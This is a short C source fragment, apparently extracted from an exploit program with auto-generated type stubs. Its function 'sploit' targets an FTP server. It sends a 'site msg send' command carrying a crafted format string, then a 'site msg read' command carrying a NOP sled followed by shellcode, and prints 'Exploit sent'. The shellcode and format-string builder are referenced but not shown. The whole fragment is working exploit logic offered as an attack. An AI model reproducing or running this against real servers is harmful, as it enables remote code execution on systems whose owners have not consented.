
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_1__ ;


struct TYPE_4__ {char* user; } ;
typedef TYPE_1__ args ;


 int BS ;
 int NOP ;
 int die (char*) ;
 int get_fmt (TYPE_1__*,char*) ;
 int memset (char*,int ,int) ;
 int printf (char*) ;
 int sc ;
 scalar_t__ send (int,char*,int ,int ) ;
 int sleep (int) ;
 int snprintf (char*,int,char*,char*,...) ;
 int strlen (char*) ;
 int strncpy (char*,int ,int) ;

void sploit(args * argp, int sock)
{
    char buf[BS], fmt[BS], sb[BS];


    memset(sb, NOP, BS);
    strncpy(sb + 100, sc, BS - 101);
    sb[BS - 1] = 0;

    get_fmt(argp, fmt);


    snprintf(buf, BS - 1, "site msg send %s %s\r\n", argp->user, fmt);
    buf[BS - 1] = 0;
    if (send(sock, buf, strlen(buf), 0) < 0)
 die("send");

    sleep(5);


    snprintf(buf, BS - 1, "site msg read %s\r\n", sb);
    buf[BS - 1] = 0;
    if (send(sock, buf, strlen(buf), 0) < 0)
 die("send");

    printf("Exploit sent\n");
    sleep(1);
}
